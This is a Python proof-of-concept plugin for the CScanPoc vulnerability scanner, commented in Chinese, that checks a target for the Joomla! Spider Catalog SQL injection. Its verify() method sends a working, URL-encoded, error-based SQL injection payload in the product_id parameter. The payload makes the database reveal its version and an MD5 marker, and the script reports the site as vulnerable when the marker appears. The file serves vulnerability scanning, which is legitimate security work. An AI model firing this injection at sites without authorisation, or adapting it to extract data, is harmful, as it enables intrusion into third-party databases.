# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Joomla_0019'  # 平台漏洞编号，留空
    name = 'Joomla! Spider Catalog  SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-11-01'  # 漏洞公布时间
    desc = '''
       Joomla! Spider Catalog  SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/22403/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '980f85d7-a015-47d3-aade-986de31a011e'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/index.php?option=com_spidercatalog&product_id=-1%27%20or%201%3d1%2b%28select%201%20and%20row%281%2c1%29%3E%28select%20count%28*%29%2cconcat%28CONCAT%28version%28%29,0x3D,MD5(3.14),0x3D,0x3D,0x3D%29%2c1111%2cfloor%28rand%28%29*2%29%29x%20from%20%28select%201%20union%20select%202%29a%20group%20by%20x%20limit%201%29%29%2b%27&view=showproduct&page_num=1&back=1"
            target_url = arg + payload
            code, head, res, _, _ = hh.http(target_url)

            if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
